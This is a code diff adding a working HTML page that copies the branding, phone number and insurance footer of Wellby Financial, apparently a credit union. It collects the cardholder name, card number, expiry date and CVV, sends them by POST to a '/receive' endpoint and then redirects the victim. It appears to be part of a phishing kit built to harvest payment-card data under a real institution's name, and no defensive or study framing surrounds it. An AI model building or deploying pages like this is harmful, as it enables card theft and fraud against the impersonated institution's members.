@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Card Details</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #29004d;
+      color: white;
+    }
+
+    .container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 90vh;
+    }
+
+    .card-box {
+      background-color: white;
+      color: black;
+      border-radius: 15px;
+      padding: 30px;
+      width: 90%;
+      max-width: 400px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
+      text-align: center;
+      position: relative;
+    }
+
+    .logo {
+      width: 60%;
+      margin-bottom: 25px;
+    }
+
+    .input-wrapper {
+      position: relative;
+      width: 90%;
+      margin: 0 auto 30px;
+    }
+
+    .input-field {
+      width: 100%;
+      padding: 18px 10px 10px 5px;
+      font-size: 16px;
+      border: 1px solid #aaa;
+      border-radius: 5px;
+      outline: none;
+      background-color: transparent;
+    }
+
+    .input-label {
+      position: absolute;
+      left: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      background: white;
+      padding: 0 4px;
+      color: #aaa;
+      font-size: 16px;
+      pointer-events: none;
+      transition: 0.2s ease all;
+    }
+
+    .input-field:focus + .input-label,
+    .input-field:not(:placeholder-shown) + .input-label {
+      top: 0;
+      transform: translateY(-50%);
+      font-size: 12px;
+      color: #5a1d9c;
+    }
+
+    .input-field:focus {
+      border-color: #5a1d9c;
+    }
+
+    .continue-btn {
+      background-color: #5a1d9c;
+      color: white;
+      border: none;
+      padding: 12px 24px;
+      font-size: 14px;
+      border-radius: 8px;
+      cursor: pointer;
+      margin-top: 15px;
+    }
+
+    footer {
+      text-align: center;
+      padding: 20px;
+      font-size: 14px;
+      color: white;
+    }
+
+    footer a {
+      color: #d3b6ff;
+      text-decoration: none;
+    }
+
+    .housing-icon {
+      font-size: 16px;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <div class="card-box">
+      <img src="assets/logo.png" alt="Wellby Financial Logo" class="logo">
+
+      <form id="cardForm">
+        <div class="input-wrapper">
+          <input type="text" id="cardname" class="input-field" placeholder=" " required />
+          <label class="input-label" for="cardname">Cardholder Name</label>
+        </div>
+        <div class="input-wrapper">
+          <input type="text" id="cardnumber" class="input-field" placeholder=" " required maxlength="19" />
+          <label class="input-label" for="cardnumber">Card Number</label>
+        </div>
+        <div class="input-wrapper">
+          <input type="text" id="expiry" class="input-field" placeholder=" " required maxlength="5" />
+          <label class="input-label" for="expiry">MM/YY</label>
+        </div>
+        <div class="input-wrapper">
+          <input type="text" id="cvv" class="input-field" placeholder=" " required maxlength="4" />
+          <label class="input-label" for="cvv">CVV</label>
+        </div>
+        <button class="continue-btn" type="submit">Continue</button>
+      </form>
+    </div>
+  </div>
+
+  <footer>
+    <p>© 2025 Wellby • (281) 488-7070</p>
+    <p>
+      <a href="#">Privacy policy</a> • Federally Insured by NCUA<br>
+      <span class="housing-icon">🏠</span> Equal Housing Lender
+    </p>
+  </footer>
+
+  <script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js'></script>
+  <script>
+    $(document).ready(function () {
+      $('#cardForm').submit(function (e) {
+        e.preventDefault();
+
+        let cardData = {};
+        let isValid = true;
+
+        $('#cardForm input').each(function () {
+          let id = $(this).attr('id');
+          let value = $(this).val().trim();
+          if (!value) {
+            $(this).css('border', '1px solid red');
+            isValid = false;
+          } else {
+            $(this).css('border', '');
+            cardData[id] = value;
+          }
+        });
+
+        if (!isValid) {
+          console.log('Please fill all required fields.');
+          return;
+        }
+
+        console.log('Card Info:', cardData);
+
+        // Replace this with your actual POST request logic
+        $.ajax({
+          url: '/receive',
+          type: 'POST',
+          data: cardData,
+          success: function (response) {
+            if (response.url) {
+              window.location.href = response.url;
+            }
+          },
+          error: function (xhr, status, error) {
+            alert('An error occurred: ' + error);
+          }
+        });
+      });
+    });
+  </script>
+
+</body>
+</html>
